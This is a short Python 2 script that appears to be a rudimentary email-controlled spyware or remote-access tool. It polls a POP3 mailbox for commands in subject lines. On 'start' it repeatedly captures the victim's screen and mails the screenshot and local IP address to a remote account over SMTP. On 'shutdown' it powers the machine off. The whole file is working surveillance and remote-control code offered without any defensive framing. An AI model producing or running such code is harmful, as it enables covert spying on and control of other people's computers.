import os
import urllib
import socket
import smtplib
import time
import mimetypes
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import PIL
from PIL import Image,ImageGrab
import poplib,email
from email.header import decode_header
import sys
def accpmail():
    try:
        p=poplib.POP3('pop.126.com')
        p.user("youemail@126.com")
        p.pass_('yourpassword')
        ret = p.stat()
    except poplib.error_proto,e:
        print "Login failed:",e
        return "fail"
    print "Login succeeded"
    mailnum=ret[0]
    down=p.retr(mailnum)
    for i in down[1]:
        if i.find("Subject:")==0:
            cmdstr=i
            print cmdstr
            break
    p.quit()
    return cmdstr


def getip():
    localip = socket.gethostbyname(socket.gethostname())
    msg = MIMEMultipart()
    msg['From']="from.com"
    msg['To']="to@126.com"
    msg['Subject']= "email for testing"

    txt = MIMEText("this is content of email ,host IP:"+localip)
    msg.attach(txt)
    im = ImageGrab.grab()
    im.save("d:\sketch.png")
    fileName = "d:\sketch.png"
    ctype,encoding = mimetypes.guess_type(fileName)
    if ctype is None or encoding is not None:
        ctype = "application/octet-stream"
    maintype,subtype = ctype.split('/',1)
    att1 = MIMEImage((lambda f: (f.read(), f.close()))(open(fileName, 'rb'))[0], _subtype = subtype)
    att1.add_header('Content-Disposition','attachment',filename=fileName)
    msg.attach(att1)
    
    smtp = smtplib.SMTP()
    smtp.connect("smtp.qq.com","25")
    smtp.login("youremail@qq.com","yourpassword")
    smtp.sendmail("youremail@qq.com","youremail@126.com",msg.as_string())
    smtp.quit()

def test2():
    try:
        sc=urllib.urlopen("http://www.baidu.com")
    except IOError:
        return False
    return True

def dothat():
    while True:
        cmdstr=accpmail()
        if test2()==True:
            if cmdstr!="fail":
                if cmdstr.find("start")!=-1:
                    getip()
                    time.sleep(10)
                    getip()
                    time.sleep(10)
                    getip()
                    time.sleep(10)
                elif cmdstr.find("shutdown")!=-1:
                    os.system("shutdown -s")
                elif cmdstr.find("stop")!=-1:
                    continue
                elif cmdstr.find("quit")!=-1:
                    break
            else:
                time.sleep(10)
                continue
        else:
            time.sleep(60)

dothat()
            
